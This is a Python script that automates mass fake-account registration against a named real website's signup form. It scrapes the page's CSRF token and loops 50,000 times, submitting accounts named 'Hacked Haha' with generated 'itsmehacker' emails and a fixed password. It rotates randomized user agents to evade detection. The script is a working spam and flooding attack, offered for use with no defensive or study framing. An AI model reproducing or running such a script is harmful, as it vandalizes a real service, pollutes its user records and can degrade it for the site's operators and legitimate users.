import requests
import random
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

# Function to generate random numbers
def generate_random_numbers():
    return ''.join(str(random.randint(0, 9)) for _ in range(3))

# Function to get token from server
def get_token(session, headers):
    url = 'https://saralshikshya.com.np/register'
    try:
        response = session.get(url, headers=headers)
        response.raise_for_status()  # Raise an exception for non-2xx status codes
        soup = BeautifulSoup(response.content, 'html.parser')
        token = soup.find('input', {'name': '_token'}).get('value')
        return token
    except requests.exceptions.RequestException as e:
        print(f"Failed to get token: {e}")
        return None

# Function to submit form
def submit_form(_token, session, _method, name, email, password, password_confirmation, headers):
    url = 'https://saralshikshya.com.np/register'
    data = {
        '_token': _token,
        '_method': _method,
        'name': name,
        'email': email,
        'password': password,
        'confirm_password': password_confirmation,
    }
    try:
        response = session.post(url, data=data, headers=headers)
        if 'https://saralshikshya.com.np/myprofile' in response.url:
            print("Form submitted successfully.")
            print(email)
        else:
            print("Form submission failed.")
    except Exception as e:
        print("An error occurred:", e)

def main():
    ua = UserAgent()
    
    # Generate 1000 random user agents
    user_agents = [ua.random for _ in range(1000)]
    
    with requests.Session() as session:
        headers = {"User-Agent": random.choice(user_agents)}
        for _ in range(50000):  # Loop 5 times for testing, you can increase this number
            email = f'itsmehacker{generate_random_numbers()}@gmail.com'
            _token = get_token(session, headers)
            if _token:
                submit_form(_token, session, 'post', 'Hacked Haha', email, 'its_hack@123450', 'its_hack@123450', headers)

if __name__ == "__main__":
    main()
